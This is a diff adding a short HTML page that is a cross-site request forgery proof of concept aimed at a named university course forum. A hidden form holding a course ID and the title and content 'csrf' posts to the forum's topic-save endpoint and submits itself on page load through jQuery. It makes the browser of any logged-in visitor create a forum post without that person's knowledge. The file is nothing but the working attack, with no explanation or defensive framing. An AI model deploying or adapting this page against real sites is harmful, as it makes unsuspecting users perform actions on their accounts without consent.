@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Document</title>
+            <script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
+
+    </head>
+    <body>
+        <form method="POST" id="csrf" name="csrf" action="http://learn.cic.tsinghua.edu.cn/b/topic/save">
+    <input type="hidden" name="courseId" value="2014-2015-2-74100132-0">
+    <!-- <input type="hidden" name="userId" value="2014311933"> -->
+    <!-- <input type="hidden" name="lastReplyUserId" value="2014311933"> -->
+    <input type="hidden" name="title" value="csrf">
+    <input type="hidden" name="content" value="csrf">
+    <input type="hidden" name="zoneCode" value="1">
+    </form>
+    </body>
+    <script>
+$(function(){
+    $('#csrf')[0].submit();
+});
+</script>
+    </html>
